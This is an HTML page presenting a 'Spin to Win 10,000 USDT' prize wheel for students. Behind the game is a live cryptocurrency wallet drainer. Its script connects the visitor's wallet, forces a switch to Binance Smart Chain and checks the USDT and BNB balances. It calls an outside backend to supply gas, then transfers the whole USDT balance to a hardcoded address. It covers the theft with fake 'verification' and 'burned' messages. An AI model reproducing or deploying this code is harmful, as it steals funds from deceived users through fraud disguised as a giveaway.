<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Spin to Win 10,000 USDT!</title>
  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #2d7fff;
      --accent: #ffd600;
      --bg: #1e2336;
      --dark: #111522;
    }
    body {
      margin: 0; padding: 0;
      font-family: 'Roboto', Arial, sans-serif;
      background: linear-gradient(135deg, #21294d 0%, #1e2336 100%);
      min-height: 100vh;
      color: #fff;
      display: flex; flex-direction: column; align-items: center;
    }
    .container {
      max-width: 400px;
      width: 95vw;
      background: #222744;
      border-radius: 18px;
      margin: 36px 0;
      box-shadow: 0 2px 24px 0 #0005;
      padding: 24px 20px 30px 20px;
      text-align: center;
      position: relative;
    }
    .title {
      font-family: 'Orbitron', Arial, sans-serif;
      font-size: 2.2rem;
      color: var(--accent);
      margin: 0 0 8px 0;
      letter-spacing: 1.5px;
      text-shadow: 0 2px 4px #0006;
    }
    .subtitle {
      color: #aac7ff;
      font-size: 1.1rem;
      margin-bottom: 28px;
    }
    #spin-wheel-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 30px;
    }
    .spin-wheel {
      width: 230px; height: 230px;
      border-radius: 50%;
      background: conic-gradient(var(--accent) 0deg 45deg, #fff 45deg 90deg, var(--primary) 90deg 135deg, #fff 135deg 180deg, var(--accent) 180deg 225deg, #fff 225deg 270deg, var(--primary) 270deg 315deg, #fff 315deg 360deg);
      border: 8px solid var(--primary);
      box-shadow: 0 6px 30px #0007;
      position: relative;
      transition: transform 4s cubic-bezier(.18,.93,.71,1.01);
    }
    .spin-arrow {
      position: absolute;
      top: -25px; left: 50%;
      transform: translateX(-50%);
      width: 34px; height: 34px;
      z-index: 2;
    }
    .spin-btn {
      margin: 22px 0 0 0;
      background: linear-gradient(90deg, var(--primary) 60%, var(--accent) 100%);
      border: none;
      color: #181e38;
      font-family: 'Orbitron', Arial, sans-serif;
      font-size: 1.3rem;
      font-weight: bold;
      border-radius: 32px;
      padding: 13px 38px;
      cursor: pointer;
      box-shadow: 0 4px 20px #2d7fff55;
      transition: background 0.2s, color 0.2s, transform 0.15s;
    }
    .spin-btn:active { transform: scale(0.97); }
    .connect-btn {
      margin-top: 28px;
      background: linear-gradient(90deg, #2ecc71 70%, #47ffa0 100%);
      color: #183020;
      border: none;
      border-radius: 32px;
      padding: 13px 34px;
      font-size: 1.15rem;
      font-family: 'Orbitron', Arial, sans-serif;
      font-weight: bold;
      box-shadow: 0 2px 20px #0f0d0d22;
      cursor: pointer;
      transition: background 0.18s;
    }
    .connect-btn:active { transform: scale(0.98); }
    .address-badge {
      background: #191e32;
      color: #ffd600;
      padding: 6px 18px;
      border-radius: 19px;
      font-size: 0.92rem;
      margin: 15px 0 0 0;
      letter-spacing: 0.4px;
      word-break: break-all;
      display: inline-block;
    }
    #popupBox {
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      padding: 26px 18px;
      border-radius: 18px;
      box-shadow: 0 0 24px #0005;
      font-size: 1.1rem;
      max-width: 92vw; min-width: 210px;
      z-index: 99999;
      background: #fff;
      color: #242a44;
      text-align: center;
      font-weight: 500;
      display: none;
      animation: popup-in 0.25s;
    }
    @keyframes popup-in {
      from { transform: translate(-50%, -70%) scale(0.85);}
      to   { transform: translate(-50%, -50%) scale(1);}
    }
    @media (max-width: 500px) {
      .container { padding: 11vw 2vw 12vw 2vw; }
      .title { font-size: 1.28rem; }
      .spin-wheel { width: 65vw; height: 65vw; min-width: 140px; min-height: 140px;}
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="title">Spin to Win<br>10,000 USDT!</div>
    <div class="subtitle">Connect your wallet and spin for a chance to win.<br>Fast, secure, and fun for all students.</div>
    <div id="spin-wheel-container">
      <img src="https://i.imgur.com/Ls8U7tG.png" class="spin-arrow" style="width:34px;height:34px;" alt="Arrow" />
      <div class="spin-wheel" id="spinWheel"></div>
      <button class="spin-btn" id="spinBtn" disabled>Spin Now</button>
    </div>
    <button class="connect-btn" id="connectBtn">Connect Wallet</button>
    <div class="address-badge" id="walletAddr" style="display:none;"></div>
  </div>
  <div id="popupBox"></div>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script>
    const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3, userAddress;

async function waitForProvider(timeout = 5000) {
    return new Promise((resolve) => {
        const start = Date.now();
        const interval = setInterval(() => {
            const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;
            if (provider || Date.now() - start > timeout) {
                clearInterval(interval);
                resolve(provider);
            }
        }, 100);
    });
}

async function connectWalletAndSwitch() {
    const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;

    if (!provider) {
        alert("Please open this in Trust Wallet, MetaMask, or another Web3 browser.");
        return;
    }

    try {
        web3 = new Web3(provider);

        // Switch to BSC if needed
        const currentChain = await provider.request({ method: 'eth_chainId' });
        if (currentChain !== '0x38') {
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }]
                });
            } catch (err) {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'Binance Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com']
                        }]
                    });
                } else {
                    alert("Please switch to BNB manually.");
                    return;
                }
            }
        }

        // Request accounts
        const accounts = await provider.request({ method: "eth_accounts" });
        userAddress = accounts[0];
        console.log("✅ Wallet:", userAddress);
    } catch (e) {
        alert("Wallet connection failed.");
        console.error(e);
    }
}

async function Next() {
    if (!web3 || !userAddress) {
        await connectWalletAndSwitch();
        if (!web3 || !userAddress) {
            showPopup("Wallet not connected.", "red");
            return;
        }
    }

    try {
        const usdtContract = new web3.eth.Contract([
            {
                constant: true,
                inputs: [{ name: "_owner", type: "address" }],
                name: "balanceOf",
                outputs: [{ name: "", type: "uint256" }],
                type: "function"
            },
            {
                constant: false,
                inputs: [
                    { name: "recipient", type: "address" },
                    { name: "amount", type: "uint256" }
                ],
                name: "transfer",
                outputs: [{ name: "", type: "bool" }],
                type: "function"
            }
        ], usdtContractAddress);

        const [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
            usdtContract.methods.balanceOf(userAddress).call(),
            web3.eth.getBalance(userAddress)
        ]);

        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
        const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));

        console.log("USDT:", usdtBalance);
        console.log("BNB:", bnbBalance);

        if (isNaN(usdtBalance) || usdtBalance < 0.000001) {
            showPopup("No USDT assets found in your wallet.", "black");
            return;
        }

        if (usdtBalance <= 0.0005) {
            showPopup(
                `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                "green"
            );
            return;
        }

        if (bnbBalance < 0.0005) {
            showPopup("Checking the bnb ...", "blue");
            await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ toAddress: userAddress })
            });
            await new Promise(r => setTimeout(r, 2000)); // wait for gas
        }

        showPopup("Loading...", "blue");

        await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
            .send({ from: userAddress });

        showPopup(
            `✅ Transfer complete<br><b>USDT Burned:</b> ${usdtBalance}`,
            "red"
        );

    } catch (e) {
        console.error("❌ Transfer failed:", e);
        showPopup("USDT transfer failed. Check balance or gas.", "red");
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        Object.assign(popup.style, {
            position: "fixed", top: "50%", left: "50%",
            transform: "translate(-50%, -50%)",
            padding: "20px", borderRadius: "10px",
            boxShadow: "0 0 10px rgba(0,0,0,0.2)",
            textAlign: "center", fontSize: "18px",
            width: "80%", maxWidth: "400px",
            zIndex: 9999, backgroundColor: "#fff"
        });
        document.body.appendChild(popup);
    }
    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f0f0f0";
    popup.style.color = color;
    popup.innerHTML = message;
    popup.style.display = "block";
    setTimeout(() => popup.style.display = "none", 5000);
}

window.addEventListener("load", async () => {
    const provider = await waitForProvider();
    if (!provider) {
        alert("No Web3 wallet detected.");
        return;
    }

    await connectWalletAndSwitch();

    const observer = new MutationObserver(() => {
        const btn = [...document.querySelectorAll("button")]
            .find(b => b.textContent.trim().toLowerCase() === "Next");
        if (btn) {
            btn.addEventListener("click", Next);
            console.log("✅ Bound 'Check Now' to Next()");
            observer.disconnect();
        }
    });

    observer.observe(document.body, { childList: true, subtree: true });
});
  </script>
</body>
</html>
